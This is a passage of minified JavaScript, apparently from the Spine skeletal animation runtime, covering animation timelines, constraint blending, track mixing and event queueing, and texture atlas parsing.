t=d;if(t.bones)for(n=1-n,b=0;b<f;b++)u[b]*=n;else{let e=t.vertices;for(var b=0;b<f;b++)u[b]+=(e[b]-u[b])*n}}return}if(u.length=f,i>=g[g.length-1]){let t=m[g.length-1];if(1==n)if(o==e.bq.add){let e=d;if(e.bones)for(let e=0;e<f;e++)u[e]+=t[e];else{let s=e.vertices;for(let e=0;e<f;e++)u[e]+=t[e]-s[e]}}else a.arrayCopy(t,0,u,0,f);else switch(o){case e.bq.setup:{let e=d;if(e.bones)for(let e=0;e<f;e++)u[e]=t[e]*n;else{let s=e.vertices;for(let e=0;e<f;e++){let i=s[e];u[e]=i+(t[e]-i)*n}}break}case e.bq.first:case e.bq.replace:for(let e=0;e<f;e++)u[e]+=(t[e]-u[e])*n;break;case e.bq.add:let s=d;if(s.bones)for(let e=0;e<f;e++)u[e]+=t[e]*n;else{let e=s.vertices;for(let s=0;s<f;s++)u[s]+=(t[s]-e[s])*n}}return}let x=p.search1(g,i),w=this.getCurvePercent(i,x),y=m[x],v=m[x+1];if(1==n)if(o==e.bq.add){let t=d;if(t.bones)for(let t=0;t<f;t++){let e=y[t];u[t]+=e+(v[t]-e)*w}else{let e=t.vertices;for(let t=0;t<f;t++){let s=y[t];u[t]+=s+(v[t]-s)*w-e[t]}}}else for(let t=0;t<f;t++){let e=y[t];u[t]=e+(v[t]-e)*w}else switch(o){case e.bq.setup:{let t=d;if(t.bones)for(let t=0;t<f;t++){let e=y[t];u[t]=(e+(v[t]-e)*w)*n}else{let e=t.vertices;for(let t=0;t<f;t++){let s=y[t],i=e[t];u[t]=i+(s+(v[t]-s)*w-i)*n}}break}case e.bq.first:case e.bq.replace:for(let t=0;t<f;t++){let e=y[t];u[t]+=(e+(v[t]-e)*w-u[t])*n}break;case e.bq.add:let t=d;if(t.bones)for(let t=0;t<f;t++){let e=y[t];u[t]+=(e+(v[t]-e)*w)*n}else{let e=t.vertices;for(let t=0;t<f;t++){let s=y[t];u[t]+=(s+(v[t]-s)*w-e[t])*n}}}}}class D extends p{constructor(t){super(t,D.propertyIds),this.events=new Array(t)}getFrameCount(){return this.frames.length}setFrame(t,e){this.frames[t]=e.time,this.events[t]=e}apply(t,e,s,i,r,n,a){if(!i)return;let o=this.frames,l=this.frames.length;if(e>s)this.apply(t,e,Number.MAX_VALUE,i,r,n,a),e=-1;else if(e>=o[l-1])return;if(s<o[0])return;let h=0;if(e<o[0])h=0;else{h=p.search1(o,e)+1;let t=o[h];for(;h>0&&o[h-1]==t;)h--}for(;h<l&&s>=o[h];h++)i.push(this.events[h])}}D.propertyIds=["12"];class B extends p{constructor(t){super(t,B.propertyIds),this.drawOrders=new Array(t)}getFrameCount(){return this.frames.length}setFrame(t,e,s){this.frames[t]=e,this.drawOrders[t]=s}apply(t,s,i,r,n,o,l){if(l==e.mJ.mixOut)return void(o==e.bq.setup&&a.arrayCopy(t.slots,0,t.drawOrder,0,t.slots.length));if(i<this.frames[0])return void(o!=e.bq.setup&&o!=e.bq.first||a.arrayCopy(t.slots,0,t.drawOrder,0,t.slots.length));let h=p.search1(this.frames,i),c=this.drawOrders[h];if(c){let e=t.drawOrder,s=t.slots;for(let t=0,i=c.length;t<i;t++)e[t]=s[c[t]]}else a.arrayCopy(t.slots,0,t.drawOrder,0,t.slots.length)}}B.propertyIds=["13"];class V extends b{constructor(t,e,s){super(t,e,["14|"+s]),this.ikConstraintIndex=0,this.ikConstraintIndex=s}getFrameEntries(){return 6}setFrame(t,e,s,i,r,n,a){t*=6,this.frames[t]=e,this.frames[t+1]=s,this.frames[t+2]=i,this.frames[t+3]=r,this.frames[t+4]=n?1:0,this.frames[t+5]=a?1:0}apply(t,s,i,r,n,a,o){let l=t.ikConstraints[this.ikConstraintIndex];if(!l.active)return;let h=this.frames;if(i<h[0]){switch(a){case e.bq.setup:return l.mix=l.data.mix,l.softness=l.data.softness,l.bendDirection=l.data.bendDirection,l.compress=l.data.compress,void(l.stretch=l.data.stretch);case e.bq.first:l.mix+=(l.data.mix-l.mix)*n,l.softness+=(l.data.softness-l.softness)*n,l.bendDirection=l.data.bendDirection,l.compress=l.data.compress,l.stretch=l.data.stretch}return}let c=0,d=0,u=p.search(h,i,6),m=this.curves[u/6];switch(m){case 0:let t=h[u];c=h[u+1],d=h[u+2];let e=(i-t)/(h[u+6]-t);c+=(h[u+6+1]-c)*e,d+=(h[u+6+2]-d)*e;break;case 1:c=h[u+1],d=h[u+2];break;default:c=this.getBezierValue(i,u,1,m-2),d=this.getBezierValue(i,u,2,m+18-2)}a==e.bq.setup?(l.mix=l.data.mix+(c-l.data.mix)*n,l.softness=l.data.softness+(d-l.data.softness)*n,o==e.mJ.mixOut?(l.bendDirection=l.data.bendDirection,l.compress=l.data.compress,l.stretch=l.data.stretch):(l.bendDirection=h[u+3],l.compress=0!=h[u+4],l.stretch=0!=h[u+5])):(l.mix+=(c-l.mix)*n,l.softness+=(d-l.softness)*n,o==e.mJ.mixIn&&(l.bendDirection=h[u+3],l.compress=0!=h[u+4],l.stretch=0!=h[u+5]))}}class _ extends b{constructor(t,e,s){super(t,e,["15|"+s]),this.transformConstraintIndex=0,this.transformConstraintIndex=s}getFrameEntries(){return 7}setFrame(t,e,s,i,r,n,a,o){let l=this.frames;l[t*=7]=e,l[t+1]=s,l[t+2]=i,l[t+3]=r,l[t+4]=n,l[t+5]=a,l[t+6]=o}apply(t,s,i,r,n,a,o){let l=t.transformConstraints[this.transformConstraintIndex];if(!l.active)return;let h,c,d,u,m,f,g=this.frames;if(i<g[0]){let t=l.data;switch(a){case e.bq.setup:return l.mixRotate=t.mixRotate,l.mixX=t.mixX,l.mixY=t.mixY,l.mixScaleX=t.mixScaleX,l.mixScaleY=t.mixScaleY,void(l.mixShearY=t.mixShearY);case e.bq.first:l.mixRotate+=(t.mixRotate-l.mixRotate)*n,l.mixX+=(t.mixX-l.mixX)*n,l.mixY+=(t.mixY-l.mixY)*n,l.mixScaleX+=(t.mixScaleX-l.mixScaleX)*n,l.mixScaleY+=(t.mixScaleY-l.mixScaleY)*n,l.mixShearY+=(t.mixShearY-l.mixShearY)*n}return}let b=p.search(g,i,7),x=this.curves[b/7];switch(x){case 0:let t=g[b];h=g[b+1],c=g[b+2],d=g[b+3],u=g[b+4],m=g[b+5],f=g[b+6];let e=(i-t)/(g[b+7]-t);h+=(g[b+7+1]-h)*e,c+=(g[b+7+2]-c)*e,d+=(g[b+7+3]-d)*e,u+=(g[b+7+4]-u)*e,m+=(g[b+7+5]-m)*e,f+=(g[b+7+6]-f)*e;break;case 1:h=g[b+1],c=g[b+2],d=g[b+3],u=g[b+4],m=g[b+5],f=g[b+6];break;default:h=this.getBezierValue(i,b,1,x-2),c=this.getBezierValue(i,b,2,x+18-2),d=this.getBezierValue(i,b,3,x+36-2),u=this.getBezierValue(i,b,4,x+54-2),m=this.getBezierValue(i,b,5,x+72-2),f=this.getBezierValue(i,b,6,x+90-2)}if(a==e.bq.setup){let t=l.data;l.mixRotate=t.mixRotate+(h-t.mixRotate)*n,l.mixX=t.mixX+(c-t.mixX)*n,l.mixY=t.mixY+(d-t.mixY)*n,l.mixScaleX=t.mixScaleX+(u-t.mixScaleX)*n,l.mixScaleY=t.mixScaleY+(m-t.mixScaleY)*n,l.mixShearY=t.mixShearY+(f-t.mixShearY)*n}else l.mixRotate+=(h-l.mixRotate)*n,l.mixX+=(c-l.mixX)*n,l.mixY+=(d-l.mixY)*n,l.mixScaleX+=(u-l.mixScaleX)*n,l.mixScaleY+=(m-l.mixScaleY)*n,l.mixShearY+=(f-l.mixShearY)*n}}class N extends x{constructor(t,e,s){super(t,e,"16|"+s),this.pathConstraintIndex=0,this.pathConstraintIndex=s}apply(t,s,i,r,n,a,o){let l=t.pathConstraints[this.pathConstraintIndex];if(!l.active)return;if(i<this.frames[0]){switch(a){case e.bq.setup:return void(l.position=l.data.position);case e.bq.first:l.position+=(l.data.position-l.position)*n}return}let h=this.getCurveValue(i);a==e.bq.setup?l.position=l.data.position+(h-l.data.position)*n:l.position+=(h-l.position)*n}}class O extends x{constructor(t,e,s){super(t,e,"17|"+s),this.pathConstraintIndex=0,this.pathConstraintIndex=s}apply(t,s,i,r,n,a,o){let l=t.pathConstraints[this.pathConstraintIndex];if(!l.active)return;if(i<this.frames[0]){switch(a){case e.bq.setup:return void(l.spacing=l.data.spacing);case e.bq.first:l.spacing+=(l.data.spacing-l.spacing)*n}return}let h=this.getCurveValue(i);a==e.bq.setup?l.spacing=l.data.spacing+(h-l.data.spacing)*n:l.spacing+=(h-l.spacing)*n}}class W extends b{constructor(t,e,s){super(t,e,["18|"+s]),this.pathConstraintIndex=0,this.pathConstraintIndex=s}getFrameEntries(){return 4}setFrame(t,e,s,i,r){let n=this.frames;n[t<<=2]=e,n[t+1]=s,n[t+2]=i,n[t+3]=r}apply(t,s,i,r,n,a,o){let l=t.pathConstraints[this.pathConstraintIndex];if(!l.active)return;let h,c,d,u=this.frames;if(i<u[0]){switch(a){case e.bq.setup:return l.mixRotate=l.data.mixRotate,l.mixX=l.data.mixX,void(l.mixY=l.data.mixY);case e.bq.first:l.mixRotate+=(l.data.mixRotate-l.mixRotate)*n,l.mixX+=(l.data.mixX-l.mixX)*n,l.mixY+=(l.data.mixY-l.mixY)*n}return}let m=p.search(u,i,4),f=this.curves[m>>2];switch(f){case 0:let t=u[m];h=u[m+1],c=u[m+2],d=u[m+3];let e=(i-t)/(u[m+4]-t);h+=(u[m+4+1]-h)*e,c+=(u[m+4+2]-c)*e,d+=(u[m+4+3]-d)*e;break;case 1:h=u[m+1],c=u[m+2],d=u[m+3];break;default:h=this.getBezierValue(i,m,1,f-2),c=this.getBezierValue(i,m,2,f+18-2),d=this.getBezierValue(i,m,3,f+36-2)}if(a==e.bq.setup){let t=l.data;l.mixRotate=t.mixRotate+(h-t.mixRotate)*n,l.mixX=t.mixX+(c-t.mixX)*n,l.mixY=t.mixY+(d-t.mixY)*n}else l.mixRotate+=(h-l.mixRotate)*n,l.mixX+=(c-l.mixX)*n,l.mixY+=(d-l.mixY)*n}}class U extends p{constructor(t,e,s){super(t,["19|"+e+"|"+s.sequence.id]),this.slotIndex=e,this.attachment=s}getFrameEntries(){return U.ENTRIES}getSlotIndex(){return this.slotIndex}getAttachment(){return this.attachment}setFrame(t,e,s,i,r){let n=this.frames;n[t*=U.ENTRIES]=e,n[t+U.MODE]=s|i<<4,n[t+U.DELAY]=r}apply(t,i,r,n,a,o,l){let h=t.slots[this.slotIndex];if(!h.bone.active)return;let d=h.attachment,m=this.attachment;if(!(d==m||d instanceof c&&d.timelineAttahment==m))return;let f=this.frames;if(r<f[0])return void(o!=e.bq.setup&&o!=e.bq.first||(h.sequenceIndex=-1));let g=p.search(f,r,U.ENTRIES),b=f[g],x=f[g+U.MODE],w=f[g+U.DELAY],y=x>>4,v=this.attachment.sequence.regions.length,A=u[15&x];if(A!=s.hold)switch(y+=(r-b)/w+1e-5|0,A){case s.once:y=Math.min(v-1,y);break;case s.loop:y%=v;break;case s.pingpong:{let t=(v<<1)-2;y%=t,y>=v&&(y=t-y);break}case s.onceReverse:y=Math.max(v-1-y,0);break;case s.loopReverse:y=v-1-y%v;break;case s.pingpongReverse:{let t=(v<<1)-2;y=(y+v-1)%t,y>=v&&(y=t-y)}}h.sequenceIndex=y}}U.ENTRIES=3,U.MODE=1,U.DELAY=2;class z{constructor(t){this.tracks=new Array,this.timeScale=1,this.unkeyedState=0,this.events=new Array,this.listeners=new Array,this.queue=new G(this),this.propertyIDs=new i,this.animationsChanged=!1,this.trackEntryPool=new o((()=>new $)),this.data=t}static emptyAnimation(){return z._emptyAnimation}update(t){t*=this.timeScale;let e=this.tracks;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(!i)continue;i.animationLast=i.nextAnimationLast,i.trackLast=i.nextTrackLast;let r=t*i.timeScale;if(i.delay>0){if(i.delay-=r,i.delay>0)continue;r=-i.delay,i.delay=0}let n=i.next;if(n){let e=i.trackLast-n.delay;if(e>=0){for(n.delay=0,n.trackTime+=0==i.timeScale?0:(e/i.timeScale+t)*n.timeScale,i.trackTime+=r,this.setCurrent(s,n,!0);n.mixingFrom;)n.mixTime+=t,n=n.mixingFrom;continue}}else if(i.trackLast>=i.trackEnd&&!i.mixingFrom){e[s]=null,this.queue.end(i),this.clearNext(i);continue}if(i.mixingFrom&&this.updateMixingFrom(i,t)){let t=i.mixingFrom;for(i.mixingFrom=null,t&&(t.mixingTo=null);t;)this.queue.end(t),t=t.mixingFrom}i.trackTime+=r}this.queue.drain()}updateMixingFrom(t,e){let s=t.mixingFrom;if(!s)return!0;let i=this.updateMixingFrom(s,e);return s.animationLast=s.nextAnimationLast,s.trackLast=s.nextTrackLast,t.mixTime>0&&t.mixTime>=t.mixDuration?(0!=s.totalAlpha&&0!=t.mixDuration||(t.mixingFrom=s.mixingFrom,s.mixingFrom&&(s.mixingFrom.mixingTo=t),t.interruptAlpha=s.interruptAlpha,this.queue.end(s)),i):(s.trackTime+=e*s.timeScale,t.mixTime+=e,!1)}apply(t){if(!t)throw new Error("skeleton cannot be null.");this.animationsChanged&&this._animationsChanged();let s=this.events,i=this.tracks,r=!1;for(let o=0,l=i.length;o<l;o++){let l=i[o];if(!l||l.delay>0)continue;r=!0;let h=0==o?e.bq.first:l.mixBlend,c=l.alpha;l.mixingFrom?c*=this.applyMixingFrom(l,t,h):l.trackTime>=l.trackEnd&&!l.next&&(c=0);let d=l.animationLast,u=l.getAnimationTime(),m=u,f=s;l.reverse&&(m=l.animation.duration-m,f=null);let g=l.animation.timelines,p=g.length;if(0==o&&1==c||h==e.bq.add)for(let s=0;s<p;s++){a.webkit602BugfixHelper(c,h);var n=g[s];n instanceof q?this.applyAttachmentTimeline(n,t,m,h,!0):n.apply(t,d,m,f,c,h,e.mJ.mixIn)}else{let s=l.timelineMode,i=l.shortestRotation,r=!i&&l.timelinesRotation.length!=p<<1;r&&(l.timelinesRotation.length=p<<1);for(let n=0;n<p;n++){let o=g[n],u=s[n]==Q?h:e.bq.setup;!i&&o instanceof y?this.applyRotateTimeline(o,t,m,c,u,l.timelinesRotation,n<<1,r):o instanceof q?this.applyAttachmentTimeline(o,t,m,h,!0):(a.webkit602BugfixHelper(c,h),o.apply(t,d,m,f,c,u,e.mJ.mixIn))}}this.queueEvents(l,u),s.length=0,l.nextAnimationLast=u,l.nextTrackLast=l.trackTime}for(var o=this.unkeyedState+tt,l=t.slots,h=0,c=t.slots.length;h<c;h++){var d=l[h];if(d.attachmentState==o){var u=d.data.attachmentName;d.setAttachment(u?t.getAttachment(d.data.index,u):null)}}return this.unkeyedState+=2,this.queue.drain(),r}applyMixingFrom(t,s,i){let r=t.mixingFrom;r.mixingFrom&&this.applyMixingFrom(r,s,i);let n=0;0==t.mixDuration?(n=1,i==e.bq.first&&(i=e.bq.setup)):(n=t.mixTime/t.mixDuration,n>1&&(n=1),i!=e.bq.first&&(i=r.mixBlend));let o=n<r.attachmentThreshold,l=n<r.drawOrderThreshold,h=r.animation.timelines,c=h.length,d=r.alpha*t.interruptAlpha,u=d*(1-n),m=r.animationLast,f=r.getAnimationTime(),g=f,p=null;if(r.reverse?g=r.animation.duration-g:n<r.eventThreshold&&(p=this.events),i==e.bq.add)for(let t=0;t<c;t++)h[t].apply(s,m,g,p,u,i,e.mJ.mixOut);else{let t=r.timelineMode,n=r.timelineHoldMix,f=r.shortestRotation,b=!f&&r.timelinesRotation.length!=c<<1;b&&(r.timelinesRotation.length=c<<1),r.totalAlpha=0;for(let x=0;x<c;x++){let c,w=h[x],v=e.mJ.mixOut,A=0;switch(t[x]){case Q:if(!l&&w instanceof B)continue;c=i,A=u;break;case j:c=e.bq.setup,A=u;break;case J:c=i,A=d;break;case K:c=e.bq.setup,A=d;break;default:c=e.bq.setup;let t=n[x];A=d*Math.max(0,1-t.mixTime/t.mixDuration)}r.totalAlpha+=A,!f&&w instanceof y?this.applyRotateTimeline(w,s,g,A,c,r.timelinesRotation,x<<1,b):w instanceof q?this.applyAttachmentTimeline(w,s,g,c,o):(a.webkit602BugfixHelper(A,i),l&&w instanceof B&&c==e.bq.setup&&(v=e.mJ.mixIn),w.apply(s,m,g,p,A,c,v))}}return t.mixDuration>0&&this.queueEvents(r,f),this.events.length=0,r.nextAnimationLast=f,r.nextTrackLast=r.trackTime,n}applyAttachmentTimeline(t,s,i,r,n){var a=s.slots[t.slotIndex];a.bone.active&&(i<t.frames[0]?r!=e.bq.setup&&r!=e.bq.first||this.setAttachment(s,a,a.data.attachmentName,n):this.setAttachment(s,a,t.attachmentNames[p.search1(t.frames,i)],n),a.attachmentState<=this.unkeyedState&&(a.attachmentState=this.unkeyedState+tt))}setAttachment(t,e,s,i){e.setAttachment(s?t.getAttachment(e.data.index,s):null),i&&(e.attachmentState=this.unkeyedState+et)}applyRotateTimeline(t,s,i,r,a,o,l,h){if(h&&(o[l]=0),1==r)return void t.apply(s,0,i,null,1,a,e.mJ.mixIn);let c=s.bones[t.boneIndex];if(!c.active)return;let d=0,u=0;if(i<t.frames[0])switch(a){case e.bq.setup:c.rotation=c.data.rotation;default:return;case e.bq.first:d=c.rotation,u=c.data.rotation}else d=a==e.bq.setup?c.data.rotation:c.rotation,u=c.data.rotation+t.getCurveValue(i);let m=0,f=u-d;if(f-=360*(16384-(16384.499999999996-f/360|0)),0==f)m=o[l];else{let t=0,e=0;h?(t=0,e=f):(t=o[l],e=o[l+1]);let s=f>0,i=t>=0;n.signum(e)!=n.signum(f)&&Math.abs(e)<=90&&(Math.abs(t)>180&&(t+=360*n.signum(t)),i=s),m=f+t-t%360,i!=s&&(m+=360*n.signum(t)),o[l]=m}o[l+1]=f,c.rotation=d+m*r}queueEvents(t,e){let s=t.animationStart,i=t.animationEnd,r=i-s,n=t.trackLast%r,a=this.events,o=0,l=a.length;for(;o<l;o++){let e=a[o];if(e.time<n)break;e.time>i||this.queue.event(t,e)}let h=!1;for(h=t.loop?0==r||n>t.trackTime%r:e>=i&&t.animationLast<i,h&&this.queue.complete(t);o<l;o++){let e=a[o];e.time<s||this.queue.event(t,e)}}clearTracks(){let t=this.queue.drainDisabled;this.queue.drainDisabled=!0;for(let t=0,e=this.tracks.length;t<e;t++)this.clearTrack(t);this.tracks.length=0,this.queue.drainDisabled=t,this.queue.drain()}clearTrack(t){if(t>=this.tracks.length)return;let e=this.tracks[t];if(!e)return;this.queue.end(e),this.clearNext(e);let s=e;for(;;){let t=s.mixingFrom;if(!t)break;this.queue.end(t),s.mixingFrom=null,s.mixingTo=null,s=t}this.tracks[e.trackIndex]=null,this.queue.drain()}setCurrent(t,e,s){let i=this.expandToIndex(t);this.tracks[t]=e,e.previous=null,i&&(s&&this.queue.interrupt(i),e.mixingFrom=i,i.mixingTo=e,e.mixTime=0,i.mixingFrom&&i.mixDuration>0&&(e.interruptAlpha*=Math.min(1,i.mixTime/i.mixDuration)),i.timelinesRotation.length=0),this.queue.start(e)}setAnimation(t,e,s=!1){let i=this.data.skeletonData.findAnimation(e);if(!i)throw new Error("Animation not found: "+e);return this.setAnimationWith(t,i,s)}setAnimationWith(t,e,s=!1){if(!e)throw new Error("animation cannot be null.");let i=!0,r=this.expandToIndex(t);r&&(-1==r.nextTrackLast?(this.tracks[t]=r.mixingFrom,this.queue.interrupt(r),this.queue.end(r),this.clearNext(r),r=r.mixingFrom,i=!1):this.clearNext(r));let n=this.trackEntry(t,e,s,r);return this.setCurrent(t,n,i),this.queue.drain(),n}addAnimation(t,e,s=!1,i=0){let r=this.data.skeletonData.findAnimation(e);if(!r)throw new Error("Animation not found: "+e);return this.addAnimationWith(t,r,s,i)}addAnimationWith(t,e,s=!1,i=0){if(!e)throw new Error("animation cannot be null.");let r=this.expandToIndex(t);if(r)for(;r.next;)r=r.next;let n=this.trackEntry(t,e,s,r);return r?(r.next=n,n.previous=r,i<=0&&(i+=r.getTrackComplete()-n.mixDuration)):(this.setCurrent(t,n,!0),this.queue.drain()),n.delay=i,n}setEmptyAnimation(t,e=0){let s=this.setAnimationWith(t,z.emptyAnimation(),!1);return s.mixDuration=e,s.trackEnd=e,s}addEmptyAnimation(t,e=0,s=0){let i=this.addAnimationWith(t,z.emptyAnimation(),!1,s);return s<=0&&(i.delay+=i.mixDuration-e),i.mixDuration=e,i.trackEnd=e,i}setEmptyAnimations(t=0){let e=this.queue.drainDisabled;this.queue.drainDisabled=!0;for(let e=0,s=this.tracks.length;e<s;e++){let s=this.tracks[e];s&&this.setEmptyAnimation(s.trackIndex,t)}this.queue.drainDisabled=e,this.queue.drain()}expandToIndex(t){return t<this.tracks.length?this.tracks[t]:(a.ensureArrayCapacity(this.tracks,t+1,null),this.tracks.length=t+1,null)}trackEntry(t,s,i,r){let n=this.trackEntryPool.obtain();return n.reset(),n.trackIndex=t,n.animation=s,n.loop=i,n.holdPrevious=!1,n.reverse=!1,n.shortestRotation=!1,n.eventThreshold=0,n.attachmentThreshold=0,n.drawOrderThreshold=0,n.animationStart=0,n.animationEnd=s.duration,n.animationLast=-1,n.nextAnimationLast=-1,n.delay=0,n.trackTime=0,n.trackLast=-1,n.nextTrackLast=-1,n.trackEnd=Number.MAX_VALUE,n.timeScale=1,n.alpha=1,n.mixTime=0,n.mixDuration=r?this.data.getMix(r.animation,s):0,n.interruptAlpha=1,n.totalAlpha=0,n.mixBlend=e.bq.replace,n}clearNext(t){let e=t.next;for(;e;)this.queue.dispose(e),e=e.next;t.next=null}_animationsChanged(){this.animationsChanged=!1,this.propertyIDs.clear();let t=this.tracks;for(let s=0,i=t.length;s<i;s++){let i=t[s];if(i){for(;i.mixingFrom;)i=i.mixingFrom;do{i.mixingTo&&i.mixBlend==e.bq.add||this.computeHold(i),i=i.mixingTo}while(i)}}}computeHold(t){let e=t.mixingTo,s=t.animation.timelines,i=t.animation.timelines.length,r=t.timelineMode;r.length=i;let n=t.timelineHoldMix;n.length=0;let a=this.propertyIDs;if(e&&e.holdPrevious)for(let t=0;t<i;t++)r[t]=a.addAll(s[t].getPropertyIds())?K:J;else t:for(let o=0;o<i;o++){let i=s[o],l=i.getPropertyIds();if(a.addAll(l))if(!e||i instanceof q||i instanceof B||i instanceof D||!e.animation.hasTimeline(l))r[o]=j;else{for(let s=e.mixingTo;s;s=s.mixingTo)if(!s.animation.hasTimeline(l)){if(t.mixDuration>0){r[o]=Z,n[o]=s;continue t}break}r[o]=K}else r[o]=Q}}getCurrent(t){return t>=this.tracks.length?null:this.tracks[t]}addListener(t){if(!t)throw new Error("listener cannot be null.");this.listeners.push(t)}removeListener(t){let e=this.listeners.indexOf(t);e>=0&&this.listeners.splice(e,1)}clearListeners(){this.listeners.length=0}clearListenerNotifications(){this.queue.clear()}}z._emptyAnimation=new m("<empty>",[],0);class ${constructor(){this.animation=null,this.previous=null,this.next=null,this.mixingFrom=null,this.mixingTo=null,this.listener=null,this.trackIndex=0,this.loop=!1,this.holdPrevious=!1,this.reverse=!1,this.shortestRotation=!1,this.eventThreshold=0,this.attachmentThreshold=0,this.drawOrderThreshold=0,this.animationStart=0,this.animationEnd=0,this.animationLast=0,this.nextAnimationLast=0,this.delay=0,this.trackTime=0,this.trackLast=0,this.nextTrackLast=0,this.trackEnd=0,this.timeScale=0,this.alpha=0,this.mixTime=0,this.mixDuration=0,this.interruptAlpha=0,this.totalAlpha=0,this.mixBlend=e.bq.replace,this.timelineMode=new Array,this.timelineHoldMix=new Array,this.timelinesRotation=new Array}reset(){this.next=null,this.previous=null,this.mixingFrom=null,this.mixingTo=null,this.animation=null,this.listener=null,this.timelineMode.length=0,this.timelineHoldMix.length=0,this.timelinesRotation.length=0}getAnimationTime(){if(this.loop){let t=this.animationEnd-this.animationStart;return 0==t?this.animationStart:this.trackTime%t+this.animationStart}return Math.min(this.trackTime+this.animationStart,this.animationEnd)}setAnimationLast(t){this.animationLast=t,this.nextAnimationLast=t}isComplete(){return this.trackTime>=this.animationEnd-this.animationStart}resetRotationDirections(){this.timelinesRotation.length=0}getTrackComplete(){let t=this.animationEnd-this.animationStart;if(0!=t){if(this.loop)return t*(1+(this.trackTime/t|0));if(this.trackTime<t)return t}return this.trackTime}}class G{constructor(t){this.objects=[],this.drainDisabled=!1,this.animState=t}start(t){this.objects.push(e.tw.start),this.objects.push(t),this.animState.animationsChanged=!0}interrupt(t){this.objects.push(e.tw.interrupt),this.objects.push(t)}end(t){this.objects.push(e.tw.end),this.objects.push(t),this.animState.animationsChanged=!0}dispose(t){this.objects.push(e.tw.dispose),this.objects.push(t)}complete(t){this.objects.push(e.tw.complete),this.objects.push(t)}event(t,s){this.objects.push(e.tw.event),this.objects.push(t),this.objects.push(s)}drain(){if(this.drainDisabled)return;this.drainDisabled=!0;let t=this.objects,s=this.animState.listeners;for(let i=0;i<t.length;i+=2){let r=t[i],n=t[i+1];switch(r){case e.tw.start:n.listener&&n.listener.start&&n.listener.start(n);for(let t=0;t<s.length;t++){let e=s[t];e.start&&e.start(n)}break;case e.tw.interrupt:n.listener&&n.listener.interrupt&&n.listener.interrupt(n);for(let t=0;t<s.length;t++){let e=s[t];e.interrupt&&e.interrupt(n)}break;case e.tw.end:n.listener&&n.listener.end&&n.listener.end(n);for(let t=0;t<s.length;t++){let e=s[t];e.end&&e.end(n)}case e.tw.dispose:n.listener&&n.listener.dispose&&n.listener.dispose(n);for(let t=0;t<s.length;t++){let e=s[t];e.dispose&&e.dispose(n)}this.animState.trackEntryPool.free(n);break;case e.tw.complete:n.listener&&n.listener.complete&&n.listener.complete(n);for(let t=0;t<s.length;t++){let e=s[t];e.complete&&e.complete(n)}break;case e.tw.event:let r=t[2+i++];n.listener&&n.listener.event&&n.listener.event(n,r);for(let t=0;t<s.length;t++){let e=s[t];e.event&&e.event(n,r)}}}this.clear(),this.drainDisabled=!1}clear(){this.objects.length=0}}var H;e.tw=void 0,(H=e.tw||(e.tw={}))[H.start=0]="start",H[H.interrupt=1]="interrupt",H[H.end=2]="end",H[H.dispose=3]="dispose",H[H.complete=4]="complete",H[H.event=5]="event";const Q=0,j=1,J=2,K=3,Z=4,tt=1,et=2;class st extends c{constructor(t){super(t),this.color=new r(1,1,1,1)}copy(){let t=new st(this.name);return this.copyTo(t),t.color.setFromColor(this.color),t}}class it extends c{constructor(t){super(t),this.endSlot=null,this.color=new r(.2275,.2275,.8078,1)}copy(){let t=new it(this.name);return this.copyTo(t),t.endSlot=this.endSlot,t.color.setFromColor(this.color),t}}var rt,nt,at,ot,lt,ht,ct,dt;e.Qb=void 0,(rt=e.Qb||(e.Qb={}))[rt.Nearest=9728]="Nearest",rt[rt.Linear=9729]="Linear",rt[rt.MipMap=9987]="MipMap",rt[rt.MipMapNearestNearest=9984]="MipMapNearestNearest",rt[rt.MipMapLinearNearest=9985]="MipMapLinearNearest",rt[rt.MipMapNearestLinear=9986]="MipMapNearestLinear",rt[rt.MipMapLinearLinear=9987]="MipMapLinearLinear",e.Df=void 0,(nt=e.Df||(e.Df={}))[nt.MirroredRepeat=33648]="MirroredRepeat",nt[nt.ClampToEdge=33071]="ClampToEdge",nt[nt.Repeat=10497]="Repeat";class ut{constructor(t){this.pages=new Array,this.regions=new Array;let s=new mt(t),i=new Array(4),r={size:t=>{t.width=parseInt(i[1]),t.height=parseInt(i[2])},format:()=>{},filter:t=>{t.minFilter=a.enumValue(e.Qb,i[1]),t.magFilter=a.enumValue(e.Qb,i[2])},repeat:t=>{-1!=i[1].indexOf("x")&&(t.uWrap=e.Df.Repeat),-1!=i[1].indexOf("y")&&(t.vWrap=e.Df.Repeat)},pma:t=>{t.pma="true"==i[1]}};var n={xy:t=>{t.x=parseInt(i[1]),t.y=parseInt(i[2])},size:t=>{t.width=parseInt(i[1]),t.height=parseInt(i[2])},bounds:t=>{t.x=parseInt(i[1]),t.y=parseInt(i[2]),t.width=parseInt(i[3]),t.height=parseInt(i[4])},offset:t=>{t.offsetX=parseInt(i[1]),t.offsetY=parseInt(i[2])},orig:t=>{t.originalWidth=parseInt(i[1]),t.originalHeight=parseInt(i[2])},offsets:t=>{t.offsetX=parseInt(i[1]),t.offsetY=parseInt(i[2]),t.originalWidth=parseInt(i[3]),t.originalHeight=parseInt(i[4])},rotate:t=>{let e=i[1];"true"==e?t.degrees=90:"false"!=e&&(t.degrees=parseInt(e))},index:t=>{t.index=parseInt(i[1])}};let o=s.readLine();for(;o&&0==o.trim().length;)o=s.readLine();for(;o&&0!=o.trim().length&&0!=s.readEntry(i,o);)o=s.readLine();let l=null,h=null,c=null;for(;null!==o;)if(0==o.trim().length)l=null,o=s.readLine();else if(l){let t=new gt(l,o);for(;;){let e=s.readEntry(i,o=s.readLine());if(0==e)break;let r=n[i[0]];if(r)r(t);else{h||(h=[]),c||(c=[]),h.push(i[0]);let t=[];for(let s=0;s<e;s++)t.push(parseInt(i[s+1]));c.push(t)}}0==t.originalWidth&&0==t.originalHeight&&(t.originalWidth=t.width,t.originalHeight=t.height),h&&h.length>0&&c&&c.length>0&&(t.names=h,t.values=c,h=null,c=null),t.u=t.x/l.width,t.v=t.y/l.height,90==t.degrees?(t.u2=(t.x+t.height)/l.width,t.v2=(t.y+t.width)/l.height):(t.u2=(t.x+t.width)/l.width,t.v2=(t.y+t.height)/l.height),this.regions.push(t)}else{for(l=new ft(o.trim());0!=s.readEntry(i,o=s.readLine());){let t=r[i[0]];t&&t(l)}this.pages.push(l)}}findRegion(t){for(let e=0;e<this.regions.length;e++)if(this.regions[e].name==t)return this.regions[e];return null}setTextures(t,e=""){for(let s of this.pages)s.setTexture(t.get(e+s.name))}dispose(){var t;for(let e=0;e<this.pages.length;e++)null===(t=this.pages[e].texture)||void 0===t||t.dispose()}}class mt{constructor(t){this.index=0,this.lines=t.split(/\r\n|\r|\n/)}readLine(){return 